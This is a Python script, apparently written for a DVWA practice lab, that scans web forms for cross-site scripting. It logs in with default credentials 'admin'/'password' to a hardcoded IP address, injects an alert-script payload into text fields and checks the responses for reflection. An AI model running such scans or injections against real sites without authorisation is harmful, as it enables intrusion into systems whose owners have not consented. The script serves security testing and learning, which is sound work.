import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

def get_all_forms(url,link): #This function allows us to retrieve all the forms from a webpage
    with requests.Session() as s: 
        s.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
        res = s.get(link)
        soup = bs(res.text,'html.parser')   
        payload = {i['name']:i.get('value','') for i in soup.select('input[name]')}
        payload['username'] = 'admin'
        payload['password'] = 'password'
        s.post(link,data=payload)
        r = s.get(url)
        soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form): #This function retrieve all the informations from a specific form
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    for textarea in form.find_all("textarea"):
        textarea_name = textarea.attrs.get("name")
        textarea_type = "textarea"
        textarea_value = textarea.attrs.get("value", "")
        inputs.append({"type": textarea_type, "name": textarea_name, "value": textarea_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, value): #This function allow us to send the form
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search" or input["type"] == "textarea":
            input["value"] = value
        try:
            if "Clear" in input["name"]: #This line is present since a button iwth this function would prevent the good functioning on the DVWA webpage
                input["value"] = " "
        except:
            print("ErrorCatch")
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    print(f"[+] Submitting the payload {data} to {target_url}")

    link = 'http://45.147.96.25:4242/login.php'
    with requests.Session() as s:
            s.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
            res = s.get(link)
            soup = bs(res.text,'html.parser')   
            payload = {i['name']:i.get('value','') for i in soup.select('input[name]')}         
            payload['username'] = 'admin'
            payload['password'] = 'password'
            s.post(link,data=payload)
            r = s.get(url)
            if form_details["method"] == "post":
                return s.post(target_url, data=data)
            else:
                return s.get(target_url, params=data)



def scan_xss(url,link,stored_check=False): #This is the main function, it will scan the webpage in order to test XSS attacks. The stored_check paramaterers is to be set to true while rescanning a webpage in order to see if the payload was successfully stored.
    forms = get_all_forms(url,link)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    if (not stored_check):
        js_script = "<script>alert('hi')</script>"
    else:
        js_script = "This is a test" #Payload without JS in order to test stored XSS
    is_vulnerable = False
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details: {form_details}")
            is_vulnerable = True
    return is_vulnerable